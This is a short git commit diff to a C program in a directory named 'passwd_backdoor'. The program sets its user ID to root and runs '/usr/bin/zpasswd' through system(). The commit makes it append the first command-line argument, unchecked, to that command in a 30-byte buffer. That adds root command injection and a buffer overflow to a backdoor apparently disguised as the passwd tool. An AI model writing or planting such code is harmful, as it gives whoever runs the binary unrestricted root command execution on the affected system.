6aafd54ea76d98a08a267b48daf9f796d35a910e
Adam Smith <zero1three@@gmail.com>
2014-03-22 20:57:01 -0400

    give c binary ability to pass parameters to python script

--- passwd_backdoor/passwd.c
+++ passwd_backdoor/passwd.c
@@ -2,9 +2,17 @@
 #include <stdlib.h>
 #include <sys/types.h>
 #include <unistd.h>
+#include <string.h>
 
-int main() {
+int main(int argc, char *argv[]) {
    setuid(0);
-   system("/usr/bin/zpasswd");
+   if (argc > 1) {
+       char cmd[30];
+       strcpy(cmd, "/usr/bin/zpasswd ");
+       strcat(cmd, argv[1]);
+       system(cmd);
+   } else {
+       system("/usr/bin/zpasswd");
+   }
    return 0;
 }
